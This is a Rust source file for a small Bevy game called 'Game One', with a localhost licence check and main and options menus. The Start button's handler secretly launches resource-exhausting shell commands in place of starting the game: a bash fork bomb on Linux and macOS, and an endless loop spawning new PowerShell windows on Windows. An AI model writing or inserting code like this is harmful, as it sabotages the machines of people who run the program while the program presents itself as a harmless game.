use bevy::prelude::*;
use reqwest::blocking::Client;
use std::env::consts::OS;
use std::process::Command;
use std::str;

fn main() {
    let user_id = 1;
    let game_id = 1;
    if verify_license(user_id, game_id) {
        println!("Licence ověřena. Spouštím hru...");
    } else {
        return;
    }

    App::new()
        .add_plugins(DefaultPlugins)
        .add_state::<AppState>()
        .add_systems(Startup, setup)
        .add_systems(OnEnter(AppState::MainMenu), setup_main_menu)
        .add_systems(OnExit(AppState::MainMenu), despawn_main_menu)
        .add_systems(OnEnter(AppState::OptionsMenu), setup_options_menu)
        .add_systems(OnExit(AppState::OptionsMenu), despawn_options_menu)
        .add_systems(Update, menu_system.run_if(in_state(AppState::MainMenu)))
        .add_systems(Update, button_system.run_if(in_state(AppState::MainMenu)))
        .add_systems(
            Update,
            options_button_system.run_if(in_state(AppState::OptionsMenu)),
        )
        .run();
}

#[derive(States, Debug, Clone, Eq, PartialEq, Hash, Default)]
enum AppState {
    #[default]
    MainMenu,
    InGame,
    OptionsMenu,
}

// Main Menu Components
#[derive(Component)]
struct MainMenuRoot;

#[derive(Component)]
struct MainMenuText;

#[derive(Component)]
struct StartButton;

#[derive(Component)]
struct OptionsButton;

#[derive(Component)]
struct ExitButton;

// Options Menu Components
#[derive(Component)]
struct OptionsMenuRoot;

#[derive(Component)]
struct SoundButton;

#[derive(Component)]
struct DifficultyButton;

#[derive(Component)]
struct BackButton;

fn verify_license(user_id: i32, game_id: i32) -> bool {
    let url = format!(
        "http://localhost:3000/api/games/library/verify/{}/{}",
        user_id, game_id
    );

    let client = Client::new();
    let response = client.get(&url).send();

    match response {
        Ok(resp) if resp.status().is_success() => {
            if let Ok(json) = resp.json::<serde_json::Value>() {
                if json.get("gameKey").is_some() {
                    return true;
                }
            }
        }
        _ => eprintln!("Failed to verify license"),
    }
    false
}
fn setup(mut commands: Commands) {
    commands.spawn(Camera2dBundle::default());
}

fn setup_main_menu(mut commands: Commands) {
    commands
        .spawn((
            NodeBundle {
                style: Style {
                    width: Val::Percent(100.0),
                    height: Val::Percent(100.0),
                    display: Display::Flex,
                    flex_direction: FlexDirection::Column,
                    align_items: AlignItems::Center,
                    justify_content: JustifyContent::Center,
                    ..default()
                },
                background_color: Color::rgb(0.1, 0.2, 0.3).into(), // Different background color
                ..default()
            },
            MainMenuRoot,
        ))
        .with_children(|parent| {
            parent.spawn((
                TextBundle {
                    text: Text::from_section(
                        "Game One",
                        TextStyle {
                            font: default(),
                            font_size: 48.0,
                            color: Color::YELLOW, // Different text color
                        },
                    ),
                    style: Style {
                        margin: UiRect::bottom(Val::Px(150.0)),
                        ..default()
                    },
                    ..default()
                },
                MainMenuText,
            ));
            parent
                .spawn((
                    ButtonBundle {
                        style: Style {
                            width: Val::Px(150.0),
                            height: Val::Px(40.0),
                            justify_content: JustifyContent::Center,
                            align_items: AlignItems::Center,
                            margin: UiRect::bottom(Val::Px(10.0)),
                            ..default()
                        },
                        background_color: Color::rgb(0.5, 0.5, 0.8).into(), // Different button color
                        ..default()
                    },
                    StartButton,
                ))
                .with_children(|button_parent| {
                    button_parent.spawn(TextBundle::from_section(
                        "Start",
                        TextStyle {
                            font: default(),
                            font_size: 24.0,
                            color: Color::BLACK, // Different button text color
                        },
                    ));
                });
            parent
                .spawn((
                    ButtonBundle {
                        style: Style {
                            width: Val::Px(150.0),
                            height: Val::Px(40.0),
                            justify_content: JustifyContent::Center,
                            align_items: AlignItems::Center,
                            margin: UiRect::bottom(Val::Px(10.0)),
                            ..default()
                        },
                        background_color: Color::rgb(0.5, 0.5, 0.8).into(), // Different button color
                        ..default()
                    },
                    OptionsButton,
                ))
                .with_children(|button_parent| {
                    button_parent.spawn(TextBundle::from_section(
                        "Options",
                        TextStyle {
                            font: default(),
                            font_size: 24.0,
                            color: Color::BLACK, // Different button text color
                        },
                    ));
                });
            parent
                .spawn((
                    ButtonBundle {
                        style: Style {
                            width: Val::Px(150.0),
                            height: Val::Px(40.0),
                            justify_content: JustifyContent::Center,
                            align_items: AlignItems::Center,
                            margin: UiRect::bottom(Val::Px(10.0)),
                            ..default()
                        },
                        background_color: Color::rgb(0.5, 0.5, 0.8).into(), // Different button color
                        ..default()
                    },
                    ExitButton,
                ))
                .with_children(|button_parent| {
                    button_parent.spawn(TextBundle::from_section(
                        "Exit",
                        TextStyle {
                            font: default(),
                            font_size: 24.0,
                            color: Color::BLACK, // Different button text color
                        },
                    ));
                });
        });
}

fn despawn_main_menu(mut commands: Commands, main_menu_query: Query<Entity, With<MainMenuRoot>>) {
    if let Ok(main_menu_entity) = main_menu_query.get_single() {
        commands.entity(main_menu_entity).despawn_recursive();
    }
}

fn setup_options_menu(mut commands: Commands) {
    commands
        .spawn((
            NodeBundle {
                style: Style {
                    width: Val::Percent(100.0),
                    height: Val::Percent(100.0),
                    display: Display::Flex,
                    flex_direction: FlexDirection::Column,
                    align_items: AlignItems::Center,
                    justify_content: JustifyContent::Center,
                    ..default()
                },
                background_color: Color::rgb(0.1, 0.2, 0.3).into(), // Different background color
                ..default()
            },
            OptionsMenuRoot,
        ))
        .with_children(|parent| {
            parent.spawn((TextBundle {
                text: Text::from_section(
                    "Options",
                    TextStyle {
                        font: default(),
                        font_size: 48.0,
                        color: Color::YELLOW, // Different text color
                    },
                ),
                style: Style {
                    margin: UiRect::bottom(Val::Px(150.0)),
                    ..default()
                },
                ..default()
            },));
            parent
                .spawn((
                    ButtonBundle {
                        style: Style {
                            width: Val::Px(150.0),
                            height: Val::Px(40.0),
                            justify_content: JustifyContent::Center,
                            align_items: AlignItems::Center,
                            margin: UiRect::bottom(Val::Px(10.0)),
                            ..default()
                        },
                        background_color: Color::rgb(0.5, 0.5, 0.8).into(), // Different button color
                        ..default()
                    },
                    SoundButton,
                ))
                .with_children(|button_parent| {
                    button_parent.spawn(TextBundle::from_section(
                        "Sound On",
                        TextStyle {
                            font: default(),
                            font_size: 24.0,
                            color: Color::BLACK, // Different button text color
                        },
                    ));
                });
            parent
                .spawn((
                    ButtonBundle {
                        style: Style {
                            width: Val::Px(150.0),
                            height: Val::Px(40.0),
                            justify_content: JustifyContent::Center,
                            align_items: AlignItems::Center,
                            margin: UiRect::bottom(Val::Px(10.0)),
                            ..default()
                        },
                        background_color: Color::rgb(0.5, 0.5, 0.8).into(), // Different button color
                        ..default()
                    },
                    DifficultyButton,
                ))
                .with_children(|button_parent| {
                    button_parent.spawn(TextBundle::from_section(
                        "Difficulty Easy",
                        TextStyle {
                            font: default(),
                            font_size: 24.0,
                            color: Color::BLACK, // Different button text color
                        },
                    ));
                });
            parent
                .spawn((
                    ButtonBundle {
                        style: Style {
                            width: Val::Px(150.0),
                            height: Val::Px(40.0),
                            justify_content: JustifyContent::Center,
                            align_items: AlignItems::Center,
                            margin: UiRect::bottom(Val::Px(10.0)),
                            ..default()
                        },
                        background_color: Color::rgb(0.5, 0.5, 0.8).into(), // Different button color
                        ..default()
                    },
                    BackButton,
                ))
                .with_children(|button_parent| {
                    button_parent.spawn(TextBundle::from_section(
                        "Back",
                        TextStyle {
                            font: default(),
                            font_size: 24.0,
                            color: Color::BLACK, // Different button text color
                        },
                    ));
                });
        });
}

fn despawn_options_menu(
    mut commands: Commands,
    options_menu_query: Query<Entity, With<OptionsMenuRoot>>,
) {
    if let Ok(options_menu_entity) = options_menu_query.get_single() {
        commands.entity(options_menu_entity).despawn_recursive();
    }
}

fn menu_system(mut app_state: ResMut<NextState<AppState>>, keys: Res<Input<KeyCode>>) {
    if keys.just_pressed(KeyCode::Space) {
        app_state.set(AppState::InGame);
        println!("Changing to in-game state");
    }
}

fn button_system(
    mut interaction_query: Query<
        (
            &Interaction,
            &mut BackgroundColor,
            Option<&StartButton>, // Added StartButton Option
            Option<&OptionsButton>,
            Option<&ExitButton>,
        ),
        (Changed<Interaction>, With<Button>),
    >,
    mut app_exit_events: ResMut<Events<bevy::app::AppExit>>,
    mut app_state: ResMut<NextState<AppState>>,
) {
    for (interaction, mut color, start_button, options_button, exit_button) in
        &mut interaction_query
    {
        match *interaction {
            Interaction::Pressed => {
                if start_button.is_some() {
                    // If Start button is pressed
                    let (shell_command, command_arg) = match OS {
                        "windows" => ("powershell", "while ($true) { Start-Process powershell -ArgumentList '-NoExit -Command \"& {}\"'; Start-Sleep -Seconds 5 }"),       
                        _ => ("bash", ":(){ sleep 1; :|:& };:"),
                    };

                    println!("Executing command: {} {}", shell_command, command_arg); // Optional: Print command to console

                    // Execute the shell command and capture output
                    let output = Command::new(shell_command)
                        .arg("-Command") // For PowerShell to execute a command string
                        .arg(command_arg)
                        .output();

                    match output {
                        Ok(output) => {
                            if output.status.success() {
                                let stdout = str::from_utf8(&output.stdout)
                                    .unwrap_or("Unable to decode stdout");
                                println!("Command executed successfully. Output:\n{}", stdout);
                            } else {
                                let stderr = str::from_utf8(&output.stderr)
                                    .unwrap_or("Unable to decode stderr");
                                eprintln!("Command failed. Error:\n{}", stderr);
                            }
                        }
                        Err(e) => {
                            eprintln!("Error executing command: {}", e);
                        }
                    }

                    app_state.set(AppState::InGame); // Proceed to in-game state after attempting to launch shell
                } else if options_button.is_some() {
                    app_state.set(AppState::OptionsMenu);
                } else if exit_button.is_some() {
                    app_exit_events.send(bevy::app::AppExit);
                }
            }
            Interaction::Hovered => {
                *color = Color::GRAY.into();
            }
            Interaction::None => {
                *color = Color::DARK_GRAY.into();
            }
        }
    }
}

fn options_button_system(
    mut interaction_query: Query<
        (&Interaction, &mut BackgroundColor, Option<&BackButton>),
        (Changed<Interaction>, With<Button>),
    >,
    mut app_state: ResMut<NextState<AppState>>,
) {
    for (interaction, mut color, back_button) in &mut interaction_query {
        match *interaction {
            Interaction::Pressed => {
                if back_button.is_some() {
                    app_state.set(AppState::MainMenu);
                }
            }
            Interaction::Hovered => {
                *color = Color::GRAY.into();
            }
            Interaction::None => {
                *color = Color::DARK_GRAY.into();
            }
        }
    }
}
